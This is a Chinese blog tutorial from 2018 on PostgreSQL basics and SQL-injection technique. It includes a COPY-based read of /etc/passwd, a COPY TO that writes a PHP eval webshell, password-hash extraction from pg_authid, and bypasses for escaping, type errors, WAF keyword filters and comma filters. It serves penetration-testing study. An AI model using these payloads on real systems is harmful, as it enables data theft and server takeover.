@@ -1,0 +1,1417 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="en">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+<link href="//cdn.bootcss.com/pace/1.0.2/themes/pink/pace-theme-flash.css" rel="stylesheet">
+<style>
+    .pace .pace-progress {
+        background: #1E92FB; /*进度条颜色*/
+        height: 3px;
+    }
+    .pace .pace-progress-inner {
+         box-shadow: 0 0 10px #1E92FB, 0 0 5px     #1E92FB; /*阴影颜色*/
+    }
+    .pace .pace-activity {
+        border-top-color: #1E92FB;    /*上边框颜色*/
+        border-left-color: #1E92FB;    /*左边框颜色*/
+    }
+</style>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="postgresql," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="spira1" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="msf就是用的postgrespl，在mac上安装msf的时候顺带安装了了这个数据库 基础操作启动服务： 1service postgresql start 切换用户： 1su postgres 进入数据库： 1psql postgres 修改密码： 1alter user postgres with password &amp;apos;xxx&amp;apos;; 使用修改后的密码登录数据库： 1psql -">
+<meta name="keywords" content="postgresql">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PostgreSQL从入门到放弃">
+<meta property="og:url" content="http://eagerseven.cn/2018/03/26/PostgreSQL从入门到放弃/index.html">
+<meta property="og:site_name" content="spira1">
+<meta property="og:description" content="msf就是用的postgrespl，在mac上安装msf的时候顺带安装了了这个数据库 基础操作启动服务： 1service postgresql start 切换用户： 1su postgres 进入数据库： 1psql postgres 修改密码： 1alter user postgres with password &amp;apos;xxx&amp;apos;; 使用修改后的密码登录数据库： 1psql -">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="https://ws3.sinaimg.cn/large/006tNc79gy1fpi9igzo61j30qw02wq35.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/006tNc79gy1fpi507ncdej310s08sq4e.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/006tNc79gy1fpi9h5q42pj30hw08ggmk.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/006tNc79gy1fpi9kb0rouj311o06qgmh.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/006tNc79gy1fpi507ncdej310s08sq4e.jpg">
+<meta property="og:image" content="https://ws4.sinaimg.cn/large/006tNc79gy1fpi51w9tcdj30z40iytat.jpg">
+<meta property="og:image" content="https://ws3.sinaimg.cn/large/006tNc79gy1fpi548c3ewj30qq0aignc.jpg">
+<meta property="og:image" content="https://ws4.sinaimg.cn/large/006tNc79gy1fpi58bcst5j30pq08st9r.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/006tNc79gy1fpi5cvawzij30w608y3zq.jpg">
+<meta property="og:image" content="https://ws3.sinaimg.cn/large/006tNc79gy1fpi5dv88nkj30g80360t0.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/006tNc79gy1fpiecnu076j30a904jgll.jpg">
+<meta property="og:image" content="https://ws2.sinaimg.cn/large/006tKfTcgy1fpikfr09voj30lc078dg8.jpg">
+<meta property="og:image" content="https://ws3.sinaimg.cn/large/006tKfTcgy1fpikgosrb2j30uk05yjs4.jpg">
+<meta property="og:image" content="https://ws2.sinaimg.cn/large/006tKfTcgy1fpikjcwntmj30q209s75d.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/006tKfTcgy1fpikzv9o6pj30uk05y74v.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/006tKfTcgy1fpil337bqnj30ui09gq3r.jpg">
+<meta property="og:image" content="https://ws3.sinaimg.cn/large/006tKfTcgy1fpilsircerj30uk06qgm6.jpg">
+<meta property="og:image" content="https://ws3.sinaimg.cn/large/006tKfTcgy1fpimdm03hfj30v003kt98.jpg">
+<meta property="og:image" content="https://ws2.sinaimg.cn/large/006tKfTcgy1fpj9rwvsolj30x802a3yi.jpg">
+<meta property="og:image" content="https://ws2.sinaimg.cn/large/006tKfTcgy1fpjaah99taj31h00cw40k.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/006tNc79gy1fpjb2gfzvuj30c6018a9y.jpg">
+<meta property="og:image" content="https://ws2.sinaimg.cn/large/006tNc79gy1fpjbadbj7ej30i501qaa4.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/006tNc79gy1fpjbfj0v17j30d701eq2u.jpg">
+<meta property="og:image" content="https://ws3.sinaimg.cn/large/006tNc79gy1fpjbllom6zj30f001ht8m.jpg">
+<meta property="og:image" content="https://ws3.sinaimg.cn/large/006tNc79gy1fpjg3ej9zxj30rc050q3q.jpg">
+<meta property="og:image" content="https://ws4.sinaimg.cn/large/006tNc79gy1fpi7erv4u8j30gn05g77d.jpg">
+<meta property="og:image" content="https://ws3.sinaimg.cn/large/006tNc79gy1fpi7fmtkw2j30bd01wdgj.jpg">
+<meta property="og:image" content="https://ws2.sinaimg.cn/large/006tNc79gy1fpi7hlmjs0j308m01fdg4.jpg">
+<meta property="og:image" content="https://ws3.sinaimg.cn/large/006tNc79gy1fpi7jj21c7j30mq0aejst.jpg">
+<meta property="og:image" content="https://ws3.sinaimg.cn/large/006tNc79gy1fpjqc6uwqfj30ui02w0t0.jpg">
+<meta property="og:image" content="https://ws2.sinaimg.cn/large/006tNc79gy1fpjqdjwf5vj30hs04674i.jpg">
+<meta property="og:image" content="https://ws4.sinaimg.cn/large/006tNc79gy1fpjqn0mttjj30uc06mt9d.jpg">
+<meta property="og:updated_time" content="2018-10-31T11:54:03.600Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="PostgreSQL从入门到放弃">
+<meta name="twitter:description" content="msf就是用的postgrespl，在mac上安装msf的时候顺带安装了了这个数据库 基础操作启动服务： 1service postgresql start 切换用户： 1su postgres 进入数据库： 1psql postgres 修改密码： 1alter user postgres with password &amp;apos;xxx&amp;apos;; 使用修改后的密码登录数据库： 1psql -">
+<meta name="twitter:image" content="https://ws3.sinaimg.cn/large/006tNc79gy1fpi9igzo61j30qw02wq35.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://eagerseven.cn/2018/03/26/PostgreSQL从入门到放弃/"/>
+
+
+
+
+
+  <title>PostgreSQL从入门到放弃 | spira1</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<script type="text/javascript" src="/lib/clipboard/clipboard.js"></script>
+<script type="text/javascript" src="/js/src/custom.js"></script>
+
+
+
+   <canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
+   <script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
+
+
+
+<div id="hexo-helper-live2d">
+  <canvas id="live2dcanvas" width="150" height="300"></canvas>
+</div>
+<style>
+  #live2dcanvas{
+    position: fixed;
+    width: 150px;
+    height: 300px;
+    opacity:0.7;
+    right: 0px;
+    z-index: 999;
+    pointer-events: none;
+    bottom: -20px;
+  }
+</style>
+<script type="text/javascript" src="/live2d/device.min.js"></script>
+<script type="text/javascript">
+const loadScript = function loadScript(c,b){var a=document.createElement("script");a.type="text/javascript";"undefined"!=typeof b&&(a.readyState?a.onreadystatechange=function(){if("loaded"==a.readyState||"complete"==a.readyState)a.onreadystatechange=null,b()}:a.onload=function(){b()});a.src=c;document.body.appendChild(a)};
+(function(){
+  if((typeof(device) != 'undefined') && (device.mobile())){
+    var trElement = document.getElementById('hexo-helper-live2d');
+    trElement.parentNode.removeChild(trElement);
+    return;
+  }else
+    if (typeof(device) === 'undefined') console.error('Cannot find current-device script.');
+  loadScript("/live2d/script.js", function(){loadlive2d("live2dcanvas", "/live2d/assets/hijiki.model.json", 0.5);});
+})();
+</script>
+
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">spira1</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-music"></i> <br />
+            
+            Music
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            Search
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="Searching..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://eagerseven.cn/2018/03/26/PostgreSQL从入门到放弃/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="spira1">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="spira1">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">PostgreSQL从入门到放弃</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-03-26T22:12:00+08:00">
+                2018-03-26
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Words count in article&#58;</span>
+                
+                <span title="Words count in article">
+                  3,429
+                </span>
+              
+
+              
+
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>msf就是用的postgrespl，在mac上安装msf的时候顺带安装了了这个数据库</p>
+<h3 id="基础操作"><a href="#基础操作" class="headerlink" title="基础操作"></a>基础操作</h3><p><strong>启动服务：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service postgresql start</span><br></pre></td></tr></table></figure>
+<p><strong>切换用户：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su postgres</span><br></pre></td></tr></table></figure>
+<p><strong>进入数据库：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psql postgres</span><br></pre></td></tr></table></figure>
+<p><strong>修改密码：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alter user postgres with password &apos;xxx&apos;;</span><br></pre></td></tr></table></figure>
+<p><strong>使用修改后的密码登录数据库：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psql -h 127.0.0.1 -U postgres -W</span><br></pre></td></tr></table></figure>
+<p><strong>切换数据库：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\c 库名</span><br></pre></td></tr></table></figure>
+<p><img src="https://ws3.sinaimg.cn/large/006tNc79gy1fpi9igzo61j30qw02wq35.jpg" alt=""></p>
+<p><strong>列库：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\l</span><br></pre></td></tr></table></figure>
+<p><img src="https://ws1.sinaimg.cn/large/006tNc79gy1fpi507ncdej310s08sq4e.jpg" alt=""></p>
+<p><strong>列表：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\dt</span><br></pre></td></tr></table></figure>
+<p><img src="https://ws1.sinaimg.cn/large/006tNc79gy1fpi9h5q42pj30hw08ggmk.jpg" alt=""></p>
+<p><strong>列表结构：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\d 表名</span><br></pre></td></tr></table></figure>
+<p><img src="https://ws1.sinaimg.cn/large/006tNc79gy1fpi9kb0rouj311o06qgmh.jpg" alt=""></p>
+<p><strong>列用户：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\du</span><br></pre></td></tr></table></figure>
+<p><img src="https://ws1.sinaimg.cn/large/006tNc79gy1fpi507ncdej310s08sq4e.jpg" alt=""></p>
+<p><strong>列系统目录列表：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select pg_ls_dir(&apos;./&apos;);</span><br></pre></td></tr></table></figure>
+<p><img src="https://ws4.sinaimg.cn/large/006tNc79gy1fpi51w9tcdj30z40iytat.jpg" alt=""></p>
+<p><strong>读文件：</strong></p>
+<ul>
+<li>只能读取当前目录下的文件，不能垮目录，并且只能使用相对路径</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select pg_read_file(&apos;&apos;)</span><br></pre></td></tr></table></figure>
+<p><img src="https://ws3.sinaimg.cn/large/006tNc79gy1fpi548c3ewj30qq0aignc.jpg" alt=""></p>
+<p>但是可以通过建立临时表的方法来读取垮目录敏感文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">create table tmp(t text);</span><br><span class="line">copy tmp from &apos;/etc/passwd&apos;;</span><br><span class="line">select * from tmp limit 1 offset 0;</span><br><span class="line">drop table tmp;</span><br></pre></td></tr></table></figure>
+<p><img src="https://ws4.sinaimg.cn/large/006tNc79gy1fpi58bcst5j30pq08st9r.jpg" alt=""></p>
+<p><strong>写文件：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">creat table tmp(t text);</span><br><span class="line">insert into tmp(t) values (&apos;&lt;?php @eval(&quot;$_post[cmd]&quot;);?&gt;&apos;);</span><br><span class="line">select * from tmp;</span><br><span class="line">copy tmp(t) to &apos;/root/1.php&apos;;</span><br><span class="line">drop table tmp;</span><br></pre></td></tr></table></figure>
+<p><img src="https://ws1.sinaimg.cn/large/006tNc79gy1fpi5cvawzij30w608y3zq.jpg" alt=""></p>
+<p><img src="https://ws3.sinaimg.cn/large/006tNc79gy1fpi5dv88nkj30g80360t0.jpg" alt=""></p>
+<p><strong>小小补充：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">progresql不区分大小写</span><br><span class="line">如果一行语句中有多个执行语句，则只会返回最后一个，例如select 1;select;结果返回2</span><br></pre></td></tr></table></figure>
+<p><strong>unknown类型：</strong></p>
+<p>postgres输入的所有字符串都被认为是unknown类型，即输入本身未定义类型，由数据库根据操作进行匹配转换，匹配失败则报错。</p>
+<p>unknown有两种输入模式：<code>单引号转义模式</code>和<code>美元符逃逸模式</code>。</p>
+<p>在单引号转义模式中允许使用前缀E/U&amp;和B/X表示转义字符串和unicode字符串和位串，其中E表示进行c语言风格的转换，U表示进行unicode转义，并支持自定义转义符，B和X会把后面跟随的字符转换为二进制数</p>
+<p>以下查询结果都将返回制表符</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">select E&apos;\t&apos;;</span><br><span class="line">select E&apos;\012&apos;;</span><br><span class="line">select E&apos;\x09&apos;;</span><br><span class="line">select E&apos;\u0009&apos;;</span><br><span class="line">select U&amp;&apos;\0009&apos;;</span><br><span class="line">select U&amp;&apos;!0009&apos; usecape &apos;!&apos;;</span><br></pre></td></tr></table></figure>
+<p>在美元逃逸模式中任何字符都不会被转移而被直接输出，以下会直接输出单引号</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select $&apos;$;</span><br></pre></td></tr></table></figure>
+<p><strong>数据类型转换：</strong></p>
+<p>postgresql支持两种数据类型转换方式，cast语句或者::运算符</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select cast(&apos;1&apos; as int);</span><br><span class="line">select &apos;1&apos;::text::int;</span><br></pre></td></tr></table></figure>
+<p><img src="https://ws1.sinaimg.cn/large/006tNc79gy1fpiecnu076j30a904jgll.jpg" alt=""></p>
+<h3 id="通过目录对象获取关键信息"><a href="#通过目录对象获取关键信息" class="headerlink" title="通过目录对象获取关键信息"></a>通过目录对象获取关键信息</h3><p>数据库名称存放于pg_database目录对象的datname字段中，所有用户都可以读取这个目录对象</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select datname from pg_database;</span><br></pre></td></tr></table></figure>
+<p><img src="https://ws2.sinaimg.cn/large/006tKfTcgy1fpikfr09voj30lc078dg8.jpg" alt=""></p>
+<p>数据库配置信息存放于pg_setting目录对象中，name字段为设置选项的名称，setting字段为选项的值。配置信息中包含有数据库文件目录（data_directory）和数据库认证配置文件路径（hba_file），只有super用户权限才能读取</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select name,setting from pg_settings where name in (&apos;hba_file&apos;,&apos;data_directory&apos;);</span><br></pre></td></tr></table></figure>
+<p><img src="https://ws3.sinaimg.cn/large/006tKfTcgy1fpikgosrb2j30uk05yjs4.jpg" alt=""></p>
+<p>数据库的用户信息存放于pg_authid目录对象中，只有super用户权限才能读取(读取到的密码是‘md5’+md5(密码)）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select rolname,rolpassword from pg_authid;</span><br></pre></td></tr></table></figure>
+<p><img src="https://ws2.sinaimg.cn/large/006tKfTcgy1fpikjcwntmj30q209s75d.jpg" alt=""></p>
+<p>判断当前用户是否具有super权限(因为pg_user视图里的usesuper字段是一个布尔值)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select usesuper from pg_user where usename=current_user;</span><br></pre></td></tr></table></figure>
+<p>在注入利用中，最关心的三点是：<code>所有schema</code>、<code>所有表和其所属的schema</code>、<code>所有字段和其所附属的表</code></p>
+<p>查询完整的schema信息：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select table_schema from information_schema.tables where table_schema not in (&apos;pg_catalog&apos;,&apos;information_schema&apos;) group by 1;</span><br></pre></td></tr></table></figure>
+<p><img src="https://ws1.sinaimg.cn/large/006tKfTcgy1fpikzv9o6pj30uk05y74v.jpg" alt=""></p>
+<p>查询所有的用户表（所有表信息存放于tables目录对象的table_name字段中）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select table_name from information_schema.tables where table_schema not in (&apos;pg_catalog&apos;,&apos;information_schema&apos;) group by 1;</span><br></pre></td></tr></table></figure>
+<p><img src="https://ws1.sinaimg.cn/large/006tKfTcgy1fpil337bqnj30ui09gq3r.jpg" alt=""></p>
+<p>查询所输入manager.admin的所有字段（所有字段信息存放于dolumns目录对象的column_name字段中，同时由table_name字段记录对应的表名）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select column_name from information_schema.columns where table_schema=&apos;manager&apos; and table_name=&apos;admin&apos;;</span><br></pre></td></tr></table></figure>
+<p><img src="https://ws3.sinaimg.cn/large/006tKfTcgy1fpilsircerj30uk06qgm6.jpg" alt=""></p>
+<h3 id="绕过技巧"><a href="#绕过技巧" class="headerlink" title="绕过技巧"></a>绕过技巧</h3><h4 id="利用多行执行忽略数据类型敏感限制"><a href="#利用多行执行忽略数据类型敏感限制" class="headerlink" title="利用多行执行忽略数据类型敏感限制"></a>利用多行执行忽略数据类型敏感限制</h4><p>在postgres中多行执行只能获取最后一行的结果，可以用来绕过数据类型敏感限制</p>
+<p>例如在测试环境中</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">content.php?id=1 union select 1,2,3,4</span><br></pre></td></tr></table></figure>
+<p>返回了数据类型错误</p>
+<p>但是可以用以下语句进行绕过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">content.php?id=1;select 1,2,3,4</span><br></pre></td></tr></table></figure>
+<p>当然了，这个绕过方法的前提是服务器端脚本处理结果集中每一行时使用的是数字索引不是字符串索引，因为后面的多行查询部分没有指定别名。否则会报错</p>
+<h4 id="利用美元符号绕过GPC和pg-escape-string"><a href="#利用美元符号绕过GPC和pg-escape-string" class="headerlink" title="利用美元符号绕过GPC和pg_escape_string"></a>利用美元符号绕过GPC和pg_escape_string</h4><p>美元符号可以在任何地方代替单引号，GPC（与addslashes作用相同）不会对美元符号进行转义</p>
+<p>例如，在测试环境中</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">content3.php?id=1 union select 1,2,3,4--</span><br></pre></td></tr></table></figure>
+<p>会返回数据类型错误</p>
+<p>可以用美元符号绕过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">content3.php?id=1 union select 1,$$2$$,$$3$$,$$4$$--</span><br></pre></td></tr></table></figure>
+<p>pg_escape_string和GPC类似</p>
+<h4 id="利用特性绕过WAF"><a href="#利用特性绕过WAF" class="headerlink" title="利用特性绕过WAF"></a>利用特性绕过WAF</h4><p>postgres会将双引号中的内容认为是一个表名或者字段名，同时在双引号扩起来的字符串中使用U&amp;前缀进行转义是合法的，可以用来绕过关键字过滤</p>
+<p>例如如下查询语句</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select U&amp;&quot;tabl\0065_sch\0065ma&quot; from U&amp;&quot;inform\0061tion_sch\0065ma&quot;.U&amp;&quot;t\0061bles&quot; where U&amp;&quot;tabl\0065_sch\0065ma&quot; not in (U&amp;&apos;pg_cat\0061log&apos;,U&amp;&apos;inform\0061tion_sch\0065ma&apos;) group by 1;</span><br></pre></td></tr></table></figure>
+<p>与以下语句是等价的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select table_schema from information_schema.tables where table_schema not in (&apos;pg_catalog&apos;,&apos;information_schema&apos;)group by 1;</span><br></pre></td></tr></table></figure>
+<p>都可以查询到所有的schema</p>
+<p><strong>常用绕过空格字符：</strong></p>
+<p>制表符：\t，0x09<br>换行符：\n，0x0a<br>分页符：0x0c<br>回车符：\r，0x0d</p>
+<h4 id="利用join绕过逗号过滤"><a href="#利用join绕过逗号过滤" class="headerlink" title="利用join绕过逗号过滤"></a>利用join绕过逗号过滤</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content.php?id=2 union select * from ((((select 1)a join (select &apos;2&apos;::varchar)b on 1=1) join (select array(select table_schema::text from information_schema.tables group by 1)::text x)c on 1=1) join (select &apos;4&apos;::varchar)d on 1=1)--</span><br></pre></td></tr></table></figure>
+<p>查询结果会返回所有schema名称</p>
+<h3 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h3><h4 id="copy"><a href="#copy" class="headerlink" title="copy"></a>copy</h4><p>copy可以用来读取文件，常规流程是建立一个临时表，将要读取的文件导入表内，然后删除表</p>
+<p>但是copy命令有很多缺陷：</p>
+<p><strong>分隔符缺陷：</strong>postgres默认以制表符（\t,0x09）为两个字段的分隔符，同时以换行符为每一行的分隔符。如果要导入的文件中含有制表符，那么制表符到下一个制表符之间的内容都会被认为是另一个字段，如果目标表只有一个字堵啊，就会报错</p>
+<p>但是copy命令提供了delimiter选项来自定义分隔符</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy test(t) from &apos;c:/test&apos; with delimiter E&apos;\x7f&apos;;</span><br></pre></td></tr></table></figure>
+<p><strong>\.缺陷：</strong>遇到\.时会终止copy并报错，因为\.是copy from stdin模式下的结束标识。例如当copy apache的配置文件时，其含有</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;FileMatch &quot;^\.ht&quot;&gt;</span><br></pre></td></tr></table></figure>
+<p><strong>编码缺陷：</strong>copy命令只能导入与服务器编码相同的文件</p>
+<p>除了以上缺陷，copy命令还有一个缺点，就是不能导出二进制文件</p>
